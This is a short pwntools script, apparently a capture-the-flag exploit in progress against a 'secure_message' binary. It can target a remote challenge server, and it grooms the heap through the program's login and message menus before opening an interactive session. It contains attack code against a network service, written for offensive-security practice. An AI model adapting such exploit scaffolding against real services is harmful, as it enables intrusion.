#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./secure_message"
elf=ELF(pwn_file)

if len(sys.argv)==1:
    conn=process("./secure_message")
    pid=conn.pid
else:
    conn=remote("178.128.87.12",31337)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()


def regist(name,pwd,desc):
    conn.sendlineafter("Choice: ","1")
    if len(name)<0x20:
        name+="\n"
    conn.sendafter("Username:",name)
    if len(pwd)<0x20:
        pwd+="\n"
    conn.sendafter("Password:",pwd)
    if len(desc)<0x80:
        desc+="\n"
    conn.sendafter(":",desc)

def login(name,pwd):
    conn.sendlineafter("Choice: ","2")
    if len(name)<0x1f:
        name+="\n"
    conn.sendafter("Username:",name)
    if len(pwd)<0x1f:
        pwd+="\n"
    conn.sendafter("Password:",pwd)

def add_msg(name,size,msg):
    conn.sendlineafter("Choice: ","1")
    conn.sendlineafter("Name: ",name)
    conn.sendlineafter("Content Size:",str(size))
    if len(msg)<size:
        msg+="\n"
    conn.send(msg)

def dele_msg(idx):
    conn.sendlineafter("Choice: ","2")
    conn.sendlineafter("Which message do you want to remove?",str(idx))

def edit_msg(idx,size,cont):
    conn.sendlineafter("Choice: ","3")
    conn.sendlineafter("Which message do you want to edit?",str(idx))
    conn.sendlineafter("Size:",str(size))
    if len(cont)<size:
        cont+="\n"
    conn.sendafter("New Content:\n",cont)
def logout():
    conn.sendlineafter("Choice: ","5")

login("\x00"*0x1f,"\x00"*0x1f)
add_msg("a",0x100,"a"*0x100)
add_msg("a",0x100,"a"*0x100)
logout()
regist("aa","aa","h"*0x50)
login("aa","aa")
for i in range(0x1e):
    add_msg("a",0x100,"a")
    
conn.interactive()
